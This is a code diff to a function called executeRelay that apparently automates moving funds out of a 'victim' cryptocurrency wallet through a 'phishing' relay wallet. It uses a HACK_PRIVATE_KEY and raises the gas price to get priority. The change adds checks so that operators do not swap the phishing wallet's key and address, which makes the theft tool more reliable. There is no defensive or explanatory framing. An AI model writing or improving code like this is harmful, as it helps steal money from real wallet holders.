@@ -39,6 +39,19 @@ export async function executeRelay({ victimAddress, phishingAddress, phishingPri
         throw new Error('Missing or invalid HACK_PRIVATE_KEY in environment variables.');
     }
 
+    const relayAccount = privateKeyToAccount(formattedPhishingKey);
+
+    // --- CRITICAL VALIDATION TO PREVENT MIX UPS ---
+    if (relayAccount.address.toLowerCase() !== phishingAddress.toLowerCase()) {
+        throw new Error(
+            `Mismatch Error: The Relay Private Key you provided belongs to ${relayAccount.address}, but you entered ${phishingAddress} as the Relay Wallet Address. You likely swapped the inputs!`
+        );
+    }
+
+    if (victimAddress.toLowerCase() === relayAccount.address.toLowerCase()) {
+        throw new Error(`Target Error: The Victim Address cannot be the exact same as the Relay Wallet Address.`);
+    }
+
     console.log(`[Relay] Starting automation for victim: ${victimAddress}`);
 
     const publicClient = createPublicClient({
@@ -49,8 +62,6 @@ export async function executeRelay({ victimAddress, phishingAddress, phishingPri
     // Calculate high-priority gas price
     const gasPrice = await publicClient.getGasPrice();
     const adjustedGasPrice = BigInt(Math.floor(Number(gasPrice) * 1.2));
-
-    const relayAccount = privateKeyToAccount(formattedPhishingKey);
 
     // --- STEP 1: FUND THE RELAY (SMART GAS) ---
     const currentBalance = await publicClient.getBalance({ address: relayAccount.address });
